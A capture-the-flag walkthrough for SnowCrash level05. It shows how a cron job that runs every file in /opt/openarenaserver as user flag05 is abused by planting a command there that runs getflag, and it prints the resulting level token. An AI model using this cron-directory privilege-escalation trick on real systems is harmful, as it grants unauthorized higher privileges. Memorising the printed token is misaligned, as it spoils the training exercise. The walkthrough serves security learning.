# 🧊 SnowCrash - Level05 Walkthrough

## Level: 05

**Objective:** Exploit a cron job running as `flag05` to execute `getflag` and retrieve the token.

### 🧩 Step-by-step Solution

**1. Notice the mail message**

When logging into `level05`, we are greeted with:

```bash
You have new mail.
```

**2. Check the mail**

The user mail is stored at `/var/mail/level05`:

```bash
cat /var/mail/level05
```

✅ Output:

```bash
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

🔍 This means every 2 minutes, a cron job is executed as user flag05, running `/usr/sbin/openarenaserver`.

**3. Inspect the script**

Check the permissions and contents of `/usr/sbin/openarenaserver`:

```bash
ls -la /usr/sbin/openarenaserver
cat /usr/sbin/openarenaserver
```

✅ Output:

```bash
#!/bin/sh
for i in /opt/openarenaserver/* ; do
    (ulimit -t 5; bash -x "$i")
    rm -f "$i"
done
```

🔍 This script executes all files in `/opt/openarenaserver/` using `bash`, then deletes them.

➕ It's run as `flag05`, so any command placed there is executed with `flag05`'s privileges!

**4. Exploit the cron job**

Inject a malicious script into `/opt/openarenaserver/`:

```bash
echo "/bin/getflag > /tmp/myflag" > /opt/openarenaserver/hello
```

**5. Wait a few minutes**

After a max of 2 minutes, the cron job will run and execute your file.

**6. Retrieve the flag**

```bash
cat /tmp/myflag
```

✅ Output:

```bash
Check flag.Here is your token : viuaaale9huek52boumoomioc
```

**🔓 Successfully moved to level06!**